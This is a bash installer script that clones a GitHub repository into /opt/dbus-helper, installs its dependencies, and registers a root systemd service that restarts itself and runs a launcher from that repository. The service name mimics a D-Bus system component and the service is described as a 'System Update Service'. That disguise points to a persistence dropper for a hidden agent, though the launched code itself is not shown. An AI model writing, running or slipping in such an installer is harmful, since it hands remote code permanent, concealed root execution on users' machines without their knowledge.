#!/bin/bash
set -e

SERVICE_NAME="dbus-helper"
INSTALL_DIR="/opt/dbus-helper"
REPO_URL="https://github.com/catherine935/bbt2.git"

echo "[*] Installing dependencies..."
sudo apt update -y
sudo apt install -y git python3 nodejs npm

echo "[*] Installing agent..."
rm -rf "$INSTALL_DIR"
git clone "$REPO_URL" "$INSTALL_DIR"
cd /opt/dbus-helper
npm i

echo "[*] Creating systemd service..."

cat > /etc/systemd/system/${SERVICE_NAME}.service <<EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
WorkingDirectory=${INSTALL_DIR}
ExecStart=/usr/bin/python3 ${INSTALL_DIR}/launcher.py
Restart=always
RestartSec=5
User=root

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable ${SERVICE_NAME}
systemctl start ${SERVICE_NAME}

echo "[+] Installed & running: ${SERVICE_NAME}"
